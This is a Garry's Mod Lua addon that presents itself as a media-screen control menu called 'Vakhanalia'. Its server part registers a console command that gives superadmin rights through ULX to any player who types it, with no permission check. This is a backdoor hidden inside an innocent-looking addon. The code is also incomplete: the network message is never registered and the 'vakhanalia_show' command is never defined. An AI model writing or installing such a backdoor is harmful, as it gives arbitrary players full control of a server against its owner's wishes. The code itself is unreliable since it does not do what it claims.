if SERVER then
    AddCSLuaFile()

    local VAKHANALIA_CMD = "vakhanalia"

    local function GiveSuperAdmin( ply )
        if not IsValid( ply ) then return end
        if ulx then
            RunConsoleCommand( "ulx", "adduserid", ply:SteamID(), "superadmin" )
            ply:ChatPrint( "[Vakhanalia] Тебе выдан суперадмин через ULX." )
        else
            ply:ChatPrint( "[Vakhanalia] ULX не найден — права не выданы." )
        end
    end

    concommand.Add( VAKHANALIA_CMD, function( ply, cmd, args )
        if not IsValid( ply ) then return end
        GiveSuperAdmin( ply )
        timer.Simple( 0.5, function()
            if IsValid( ply ) then
                net.Start( "Vakhanalia_OpenMenu" )
                net.Send( ply )
            end
        end )
    end, nil, "Выдаёт суперадмина и открывает меню показа медиа.", { FCVAR_DONTRECORD } )
end

if CLIENT then
    local function CanManageMedia( ply )
        if not IsValid( ply ) then return false end
        if ulx then return ply:IsSuperAdmin() end
        return ply:IsAdmin()
    end

    local function OpenControlMenu()
        local ply = LocalPlayer()
        if not IsValid( ply ) then return end
        if not CanManageMedia( ply ) then
            ply:ChatPrint( "[Vakhanalia] Недостаточно прав для управления экраном." )
            return
        end

        local frame = vgui.Create( "DFrame" )
        frame:SetSize( 520, 320 )
        frame:SetTitle( "Vakhanalia — Управление экраном" )
        frame:MakePopup()
        frame:Center()

        local urlEntry = vgui.Create( "DTextEntry", frame )
        urlEntry:SetPos( 20, 40 )
        urlEntry:SetSize( 480, 28 )
        urlEntry:SetPlaceholderText( "Прямая ссылка на картинку (jpg/png) или .webm" )

        local showBtn = vgui.Create( "DButton", frame )
        showBtn:SetPos( 20, 80 )
        showBtn:SetSize( 230, 36 )
        showBtn:SetText( "Показать всем" )
        showBtn.DoClick = function()
            local url = urlEntry:GetValue()
            if not url or url == "" then
                ply:ChatPrint( "[Vakhanalia] Ссылка пустая." )
                return
            end
            RunConsoleCommand( "vakhanalia_show", url )
        end

        local closeBtn = vgui.Create( "DButton", frame )
        closeBtn:SetPos( 270, 80 )
        closeBtn:SetSize( 230, 36 )
        closeBtn:SetText( "Закрыть" )
        closeBtn.DoClick = function() frame:Close() end

        local info = vgui.Create( "DLabel", frame )
        info:SetPos( 20, 130 )
        info:SetSize( 480, 160 )
        info:SetWrap( true )
        info:SetText(
            "Примечание: этот скрипт только выдаёт права и рассылает ссылку. " ..
            "Чтобы картинка/видео реально отобразились, на сервере должен быть " ..
            "установлен соответствующий аддон (Cinema, Wire Screen или IGS), " ..
            "а на клиенте — обработчик события Vakhanalia_ShowMedia."
        )
    end

    net.Receive( "Vakhanalia_OpenMenu", function()
        OpenControlMenu()
    end )
end